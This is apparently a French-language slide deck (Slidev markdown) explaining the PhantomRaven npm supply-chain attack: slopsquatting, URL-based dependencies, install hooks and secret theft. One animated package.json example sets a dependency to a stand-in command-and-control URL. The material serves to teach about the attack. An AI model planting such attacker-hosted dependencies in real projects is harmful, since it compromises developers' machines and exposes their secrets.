---
background: raven.jpg
layout: cover
transition: none
---

# PhantomRaven

<div class="abs-br text-xl">
    Photo: <a href="https://unsplash.com/@sashamatic?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Sasha Matic</a> sur <a href="https://unsplash.com/photos/a-flock-of-birds-flying-over-a-forest-ScqXKwEiK48?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>
      
</div>

---

# Chaîne d'Attaque

- SlopSquatting
- Dépendances par URLs
- Pre/Post Install Hooks
- Voler les secrets

---

# Dépendances par URL

````md magic-move
```json
{
  "name": "phantomRaven",
  "type": "module",
  "dependencies": {
    "faker": "6.6.6"
  }
}
```
```json
{
  "name": "phantomRaven",
  "type": "module",
  "dependencies": {
    "payload": "https://my.c2.server/malicious/package"
  }
}
```
```json
{
  "name": "phantomRaven",
  "type": "module",
  "dependencies": {}
}
```
````

---
layout: section
---

# Ça arrive juste chez NPM?

## `num2words.py` a eu la même attaque en Juillet
